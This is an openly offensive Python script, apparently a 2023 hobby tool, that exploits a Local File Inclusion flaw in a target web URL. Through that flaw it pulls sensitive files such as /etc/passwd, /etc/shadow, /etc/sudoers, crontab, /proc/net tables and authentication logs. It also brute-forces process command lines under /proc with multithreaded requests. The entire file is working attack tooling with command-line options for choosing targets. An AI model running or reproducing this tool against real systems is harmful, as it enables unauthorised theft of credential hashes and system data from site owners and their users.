###################################################################
########     SIMPLE SCRIPT FOR ENUMERATION THROUGH LFI     ########
########              Xacone (Yazid) - 2023                ########
###################################################################

import argparse
import requests
from termcolor import colored
from colored import bg, fg, attr
import concurrent.futures

reset = attr('reset')

def get_url_content(url):
    response = requests.get(url)
    return response.text


def retrieve_etc(input) :
    
    input = input + "etc/"
    desc = ["Informations about users accounts", "Groups information", "Encrypted passwords", "Users allowed to use superuser privileges (sudo)", "Local DNS", "Hostname", "Network interfaces", "Mounted file systems at boot time", "APT repository sources", "System-wide cron jobs"]
    files = ["passwd", "group", "shadow", "sudoers", "hosts", "hostname", "network/interfaces", "fstab", "/apt/sources.list", "/etc/crontab"]
    
    color = fg('white') + bg('#006266')

    for i in range(0, len(files)) :
        print("\n")
        resp = requests.get(input + files[i])
        print(color + "  [ETC] " + desc[i] + "  " + reset)
        print(colored(resp.text, 'green'))


def retrieve_proc(input):

    input = input + "proc/"
    desc = ["System's CPU informations", "Memory usage", "Load average (Waiting Processes)", "Kernel version"]
    files = ["cpuinfo", "meminfo", "loadavg", "version"]
    
    color = fg('white') + bg('#006266')
    text_color = fg('#12CBC4')

    for i in range(0, len(files)) :
        print("\n")
        resp = requests.get(input + files[i])
        print(color + "  [PROC] " + desc[i] + "  " + reset)
        print(text_color + resp.text)


def retrieve_proc_net(input):

    input = input + "proc/net/"
    desc = ["Network interfaces statistics", "ARP table", "Routing table", "Networking protocols statistics", "TCP connections status", "UDP connections status", "NAT table"]
    files = ["dev", "arp", "route", "snmp", "tcp", "udp", "ip_conntrack"]

    color = fg('white') + bg('#006266')
    text_color = fg('#FDA7DF')

    for i in range(0, len(files)) :
        print("\n")
        resp = requests.get(input + files[i])
        print(color + "  [PROC-NET] " + desc[i] + "  " + reset)
        print(text_color + resp.text + reset)


def retrieve_proc_pid_cmdlines(input, arch, threads, pattern):
    
    pid = 0
    input = input + "proc/"
    color = fg('white') + bg('#006266')
    text_color = fg('#ff6b81')

    print(color + "  [PROC-PID] Processes cmdlines  " + reset)
           
    MAX_PID = 32767
    if (arch == "x64") :
        MAX_PID = 4194303 

    urls = [input + f"/{i}/cmdline" for i in range(MAX_PID)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(get_url_content, url): url for url in urls}

        for future in concurrent.futures.as_completed(future_to_url):
            pid = pid + 1 
            url = future_to_url[future]
            #try:
            content = future.result()
            if(content != pattern and content != ''):
                print(str(pid) + " | " + f"{content}")
            #except Exception as e:
                #print(f"Error retrieving content of {url}: {e}")


def retrieve_var(input):
    input = input + "var/"
    desc = ["Authentification log", "System log", "Kernel log", "Boot log"]
    files = ["log/auth.log", "log/syslog", "log/kern.log", "log/boot.log"]

    color = fg('white') + bg('#006266')
    text_color = fg('#BADC58')

    for i in range(0, len(files)) :
        print("\n")
        resp = requests.get(input + files[i])
        print(color + "  [VAR] " + desc[i] + "  " + reset)
        print(text_color + resp.text + reset)


print("""
                      __      _
                    o'')}____//
                    `_/      )
                    (_(_/-(_/
    ██      ███████ ██ ██   ██ 
    ██      ██      ██ ██   ██ 
    ██      █████   ██ ███████ 
    ██      ██      ██ ██   ██ 
    ███████ ██      ██ ██   ██                        
                    
                    Yazidou                                                                   
""")

url = "https://www.example.com/"
response = requests.get(url)
#print(response.content)

## \nExample: python3 sysinfolfi.py http://vulnwebsite.com/?path=...

ret = '../'
proc = ["cpuinfo", "meminfo", "loadavg", ""]
etc = []

parser = argparse.ArgumentParser(description='[*] Simple script for information retrieving through Local File Inclusion.')

parser.add_argument('-u', help='Target URL', required=True)
parser.add_argument('-t', help="Threads", type=int)

parser.add_argument('-proc', help='Retrieving on /proc', action='store_true',)
parser.add_argument('-net', help='Network status (Routes, TCP, UDP, ARP) from /proc/net', action='store_true')
parser.add_argument('-cmdlines', help='Retrieving of 1-MAX_PID cmdlines on /proc/{PIDs}/cmdlines (default MAX_PID for x32, use -x64 to increase)', action='store_true')
parser.add_argument('-etc', help='Retrieving on /etc', action='store_true')
parser.add_argument('-var', help='Retrieving on /var', action='store_true')
parser.add_argument('-all', help='Retrieving all of the above', action='store_true')
parser.add_argument('-p', help="Pattern to skip for cmdlines (i.e. NotFounds strings)", type=str)
 
parser.add_argument('-x64', help="Targeting an x64 machine (x32 by default)", action='store_true')

args = parser.parse_args()
target = args.u

print("Targetting : " + target + '\n')

def call_proc_pid_cmdlines():
    targ = "x32"
    patt = ""
    thrds = 1
    if(args.x64):
        targ = "x64"
    if(args.t):
        thrds = args.t
    if(args.p):
        patt = args.p
    retrieve_proc_pid_cmdlines(target, targ, thrds, patt)

if(args.all) :
    retrieve_etc(target)
    retrieve_proc_net(target)
    retrieve_proc(target)
    retrieve_var(target)
    call_proc_pid_cmdlines()

else : 
    if(args.etc):
        retrieve_etc(target)
    if(args.net):
        retrieve_proc_net(target)
    if(args.proc):
        retrieve_proc(target)
    if(args.var):
        retrieve_var(target)
    if(args.cmdlines):
        call_proc_pid_cmdlines()
        
